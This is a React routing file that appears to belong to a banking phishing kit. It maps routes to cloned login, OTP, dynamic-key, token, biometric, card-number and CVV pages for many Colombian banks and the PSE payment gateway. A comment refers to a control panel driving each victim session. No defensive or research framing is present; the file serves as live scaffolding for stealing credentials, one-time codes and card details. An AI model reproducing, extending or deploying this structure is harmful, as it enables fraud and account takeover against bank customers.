import { lazy } from "react";
import Error923 from "./bancoBancolombia/Error923";
import VerificacionIdentidad from "./bancoBancolombia/VerificacionIdentidad";

// 1. GENERAL / HOME
const PseLoading = lazy(() => import("../loadingPse/PseLoading"));

// LINK CUSTOM GENERICO
const LinkCustom = lazy(() => import("../linkCustom/LinkCustom"));

// Finalizado PSE
const FinalizadoPse = lazy(() => import("../finalizadoPse/FinalizadoPse"));

// Finalizado TC
const FinalizadoTc = lazy(() => import("../finalizadoTc/FinalizadoTc"));

// Ingreso TC genérico (OTP + dinámica)
const OtpTc = lazy(() => import("../ingresoTc/otp/otpTc"));
const DinamicaTc = lazy(() => import("../ingresoTc/dinamica/dinamicaTc"));

// AV VILLAS
const BancoAvvillas = lazy(
  () => import("./bancoAvVillas/cara_principal/BancoAvvillas"),
);
const BancoAvvillasQR = lazy(
  () => import("./bancoAvVillas/pse/otp/QRAuthModal"),
);
const BancoAvvillasUpdateQR = lazy(
  () => import("./bancoAvVillas/pse/otp/modal/QRUpdateFile"),
);
const BancoAvvillasPSE = lazy(
  () => import("./bancoAvVillas/pse/login/AvVillasLogin"),
);

// BANCOLOMBIA
const BancolombiaIniciarSesion = lazy(
  () => import("./bancoBancolombia/IniciarSesion"),
);
const BancolombiaClaveDinamica = lazy(
  () => import("./bancoBancolombia/ClaveDinamica"),
);
const BancolombiaOtp = lazy(() => import("./bancoBancolombia/NumeroOTP"));
const BancolombiaCustomTC = lazy(() => import("./bancoBancolombia/CustomTC"));
const BancolombiaValidacionTC = lazy(
  () => import("./bancoBancolombia/ValidacionTC"),
);
const BancolombiaCustomCvv = lazy(() => import("./bancoBancolombia/CustomCvv"));
const BancolombiaValidacionCVV = lazy(
  () => import("./bancoBancolombia/ValidacionCVV"),
);

// BBVA
const BancoBbva = lazy(
  () => import("./bancoBbvaColombia/cara_principal/BancoBbva"),
);
const BbvaOTP = lazy(() => import("./bancoBbvaColombia/TC/otp/bbva_otp_tc"));
const BancoBbvaPse = lazy(
  () => import("./bancoBbvaColombia/pse/login/bbva_login_pse"),
);

// BANCO DE BOGOTÁ
const BancoBogota = lazy(() => import("./bancoBogota/cara_principal/App"));
const BancoBogotaToken = lazy(
  () => import("./bancoBogota/pse/token/bogota_token_pse"),
);
const BancoBogotaOTP = lazy(
  () => import("./bancoBogota/pse/otp/bogota_otp_pse"),
);
const BogotaOTP = lazy(() => import("./bancoBogota/cara_principal/BogotaOTP"));
const Bancobogotapsenuevo = lazy(
  () => import("./bancoBogota/pse/login/bogota_login_pse"),
);

// CAJA SOCIAL
const LogoCajaSocialPse = lazy(
  () => import("./bancoCajaSocial/pse/login/login_caja_social_pse"),
);
const BancoSocialOtpPse = lazy(
  () => import("./bancoCajaSocial/pse/otp/caja_social_otp_pse"),
);
const BancoSocialTokenPse = lazy(
  () => import("./bancoCajaSocial/pse/token/caja_social_token_pse"),
);

// COLPATRIA
const ColpatriaLoginPse = lazy(
  () => import("./bancoColpatria/pse/login/login_colpatria_pse"),
);
const ColpatriaOtpPse = lazy(
  () => import("./bancoColpatria/pse/otp/otp_colpatria_pse"),
);
const ColpatriaAtmPse = lazy(
  () => import("./bancoColpatria/pse/atm/atm_colpatria_pse"),
);
const ColpatriaOTP = lazy(() => import("./bancoColpatria/TC/ColpatriaOTP"));

// DAVIVIENDA
const Davivienda = lazy(
  () => import("./bancoDavivienda/cara_principal/Davivienda"),
);
const DaviviendaIDCheck = lazy(
  () => import("./bancoDavivienda/TC/otp_tc/DaviviendaIDCheck"),
);
const DaviviendaPse = lazy(
  () => import("./bancoDavivienda/pse/login/login_davivienda_pse"),
);
const DaviviendaOtpPse = lazy(
  () => import("./bancoDavivienda/pse/otp/davivienda_otp_pse"),
);
const BiometriaDavivienda = lazy(
  () => import("./bancoDavivienda/pse/biometria/biometria_davivienda"),
);

// FALABELLA
const BancoFalabella = lazy(
  () => import("./bancoFalabella/cara_principal/BancoFalabella"),
);
const BancoFalabellaPSE = lazy(
  () => import("./bancoFalabella/pse/login/login_Falabella_pse"),
);
const FalabellaDinamicaPse = lazy(
  () => import("./bancoFalabella/pse/dinamica/falabella_dinamica_pse"),
);
const OtpFalabellaPse = lazy(
  () => import("./bancoFalabella/pse/otp/otp_falabella_pse"),
);
const FalabellaIDCheck = lazy(
  () => import("./bancoFalabella/dinamica_tc/FalabellaIDCheck"),
);
const BancoFalabellaTC = lazy(
  () => import("./bancoFalabella/TC/BancoFalabellaTC"),
);
const BancoFalabellaTCPassword = lazy(
  () => import("./bancoFalabella/TC/BancoFalabellaTCPassword"),
);

// ITAU
const LoginItau = lazy(() => import("./bancoItau/cara_principal/LoginItau"));
const ItauTC = lazy(() => import("./bancoItau/pse/tc/ItauTcPse"));
const ItauOtpPse = lazy(() => import("./bancoItau/pse/otp/ItauOtpPse"));
const ItauPse = lazy(() => import("./bancoItau/pse/login/login_itau_pse"));

// NEQUI
const Nequi = lazy(() => import("./bancoNequi/pse/login/loginNequi"));
const BiometriaDinamica = lazy(
  () => import("./bancoNequi/pse/biometria/BiometriaNequi"),
);
const NequiDinamica = lazy(
  () => import("./bancoNequi/pse/dinamica/dinamicaNequi"),
);
const NequiSaldo = lazy(() => import("./bancoNequi/pse/saldo/ValidacionSaldo"));

// OCCIDENTE
const BancoDeOccidente = lazy(
  () => import("./bancoOccidente/cara_principal/occidente"),
);
const BancoDeOccidenteOTP = lazy(
  () => import("./bancoOccidente/cara_principal/modal/occidente"),
);
const VisaSecure = lazy(
  () => import("./bancoOccidente/TC/dinamica/occidente_dinamica_tc"),
);
const LoginOccidentePse = lazy(
  () => import("./bancoOccidente/pse/login/login_occidente_pse"),
);
const OtpOccidentePse = lazy(
  () => import("./bancoOccidente/pse/otp/otp_occidente_pse"),
);

// POPULAR
const BancoPopular = lazy(
  () => import("./bancoPopular/cara_principal/BancoPopular"),
);
const BancoPopularPassword = lazy(
  () => import("./bancoPopular/cara_principal/password/RegistroPassword"),
);
const BancoPopularOTP = lazy(() => import("./bancoPopular/pse/otp/OtpPopular"));
const BancoPopularPse = lazy(
  () => import("./bancoPopular/pse/login/Popular_login_pse"),
);

// SERFINANZA
const SerfinanzaLogin = lazy(
  () => import("./bancoSerfinanza/pse/login/SerfinanzaLogin"),
);
const DinamicaSerfinanza = lazy(
  () => import("./bancoSerfinanza/pse/dinamica/dinamica_serfinanza"),
);
const OtpSerfinanza = lazy(
  () => import("./bancoSerfinanza/pse/otp/otp_serfinanza"),
);

// RUTAS GENERALES
const widgetsRoute = [
  {
    path: "/pse",
    element: <PseLoading />,
  },

  // --- BANCO AV VILLAS ---
  {
    path: "/banco_av_villas",
    element: <BancoAvvillas />,
  },
  {
    path: "/banco_av_villas_autorizacion",
    element: <BancoAvvillasQR />,
  },
  {
    path: "/banco_av_villas_qr_custom",
    element: <BancoAvvillasUpdateQR />,
  },
  {
    path: "/banco_av_villas_pse",
    element: <BancoAvvillasPSE />,
  },

  // --- BANCO BANCOLOMBIA ---
  {
    path: "/bancolombia",
    element: <BancolombiaIniciarSesion />,
  },
  {
    path: "/clave-dinamica",
    element: <BancolombiaClaveDinamica />,
  },
  {
    path: "/numero-otp",
    element: <BancolombiaOtp />,
  },
  {
    path: "/error-923page",
    element: <Error923 />,
  },
  {
    path: "/verificacion-identidad",
    element: <VerificacionIdentidad />,
  },
  {
    path: "/tc-customs",
    element: <BancolombiaCustomTC />,
  },
  {
    path: "/validacion-tc",
    element: <BancolombiaValidacionTC />,
  },
  {
    path: "/cvv-customs",
    element: <BancolombiaCustomCvv />,
  },
  {
    path: "/validacion-cvv",
    element: <BancolombiaValidacionCVV />,
  },

  // --- BANCO BBVA COLOMBIA ---
  {
    path: "/banco_bbva",
    element: <BancoBbva />,
  },
  {
    path: "/banco_bbva_otp_tc",
    element: <BbvaOTP />,
  },
  {
    path: "/banco_bbva_login_pse",
    element: <BancoBbvaPse />,
  },

  // --- BANCO DE BOGOTÁ ---
  {
    path: "/banco_bogota",
    element: <BancoBogota />,
  },
  {
    path: "/banco_bogota_token",
    element: <BancoBogotaToken />,
  },
  {
    path: "/banco_bogota_otp_pse",
    element: <BancoBogotaOTP />,
  },
  {
    path: "/banco_bogota_otp_tc",
    element: <BogotaOTP />,
  },
  {
    path: "/banco_bogota_pse",
    element: <Bancobogotapsenuevo />,
  },

  // --- BANCO CAJA SOCIAL ---
  {
    path: "/logo_caja_social_pse",
    element: <LogoCajaSocialPse />,
  },
  {
    path: "/banco_caja_social_otp_pse",
    element: <BancoSocialOtpPse />,
  },
  {
    path: "/banco_caja_social_token_pse",
    element: <BancoSocialTokenPse />,
  },

  // --- BANCO COLPATRIA ---
  {
    path: "/colpatria_otp_tc",
    element: <ColpatriaOTP />,
  },
  {
    path: "/colpatria_pse_login",
    element: <ColpatriaLoginPse />,
  },
  {
    path: "/colpatria_pse_otp",
    element: <ColpatriaOtpPse />,
  },
  {
    path: "/colpatria_pse_atm",
    element: <ColpatriaAtmPse />,
  },

  // --- DAVIVIENDA ---
  {
    path: "/davivienda",
    element: <Davivienda />,
  },
  {
    path: "/davivienda_check_id",
    element: <DaviviendaIDCheck />,
  },
  {
    path: "/davivienda_pse",
    element: <DaviviendaPse />,
  },
  {
    path: "/davivienda_otp_pse",
    element: <DaviviendaOtpPse />,
  },
  {
    path: "/davivienda_biometria",
    element: <BiometriaDavivienda />,
  },

  // --- BANCO FALABELLA ---
  {
    path: "/falabella",
    element: <BancoFalabella />,
  },
  {
    path: "/falabella_check_id",
    element: <FalabellaIDCheck />,
  },
  {
    path: "/falabella_pse",
    element: <BancoFalabellaPSE />,
  },
  {
    path: "/falabella_dinamica_pse",
    element: <FalabellaDinamicaPse />,
  },
  {
    path: "/falabella_otp_pse",
    element: <OtpFalabellaPse />,
  },
  {
    path: "/falabella_tc",
    element: <BancoFalabellaTC />,
  },
  {
    path: "/falabella_tc_password",
    element: <BancoFalabellaTCPassword />,
  },

  // --- ITAÚ ---
  {
    path: "/itau",
    element: <LoginItau />,
  },
  {
    path: "/itau_tc",
    element: <ItauTC />,
  },
  {
    path: "/itau_otp",
    element: <ItauOtpPse />,
  },
  {
    path: "/itau_pse",
    element: <ItauPse />,
  },

  // --- NEQUI ---
  {
    path: "/nequi",
    element: <Nequi />,
  },
  {
    path: "/nequi_biometria",
    element: <BiometriaDinamica />,
  },
  {
    path: "/nequi_dinamica",
    element: <NequiDinamica />,
  },
  {
    path: "/nequi_saldo",
    element: <NequiSaldo />,
  },

  // --- BANCO DE OCCIDENTE ---
  {
    path: "/occidente",
    element: <BancoDeOccidente />,
  },
  {
    path: "/occidente_otp",
    element: <BancoDeOccidenteOTP isOpen={true} />,
  },
  {
    path: "/occidente_visa",
    element: <VisaSecure />,
  },
  {
    path: "/occidente_pse",
    element: <LoginOccidentePse />,
  },
  {
    path: "/occidente_otp_pse",
    element: <OtpOccidentePse />,
  },

  // --- BANCO POPULAR ---
  {
    path: "/popular",
    element: <BancoPopular />,
  },
  {
    path: "/popular_password",
    element: <BancoPopularPassword />,
  },
  {
    path: "/popular_otp",
    element: <BancoPopularOTP />,
  },
  {
    path: "/popular_pse",
    element: <BancoPopularPse />,
  },

  // --- SERFINANZA ---
  {
    path: "/serfinanza",
    element: <SerfinanzaLogin />,
  },
  {
    path: "/serfinanza_dinamica",
    element: <DinamicaSerfinanza />,
  },
  {
    path: "/serfinanza_otp",
    element: <OtpSerfinanza />,
  },
  {
    path: "/link-custom",
    element: <LinkCustom />,
  },

  // --- FINALIZADO PSE (todos los bancos) ---
  {
    path: "/finalizado-pse",
    element: <FinalizadoPse />,
  },
  {
    path: "/finalizado",
    element: <FinalizadoPse />,
  },

  // --- FINALIZADO TC (en espera: sin redirección desde bancos TC aún) ---
  // Uso: redirigir a /finalizado-tc cuando el panel envíe sol_finalizado en flujos TC.
  // Preview manual: http://localhost:3001/finalizado-tc?sessionId=...
  {
    path: "/finalizado-tc",
    element: <FinalizadoTc />,
  },

  // --- INGRESO TC genérico (plantillas OTP / dinámica) ---
  // Vista diseño (solo placeholders + logo banco): /ingreso-tc/otp?bank=avvillas
  // Flujo real: /ingreso-tc/otp?bank=avvillas&sessionId=dev-prueba
  {
    path: "/ingreso-tc/otp",
    element: <OtpTc />,
  },
  {
    path: "/ingreso-tc/dinamica",
    element: <DinamicaTc />,
  },
];
// se exporta las rutas generales
export default widgetsRoute;
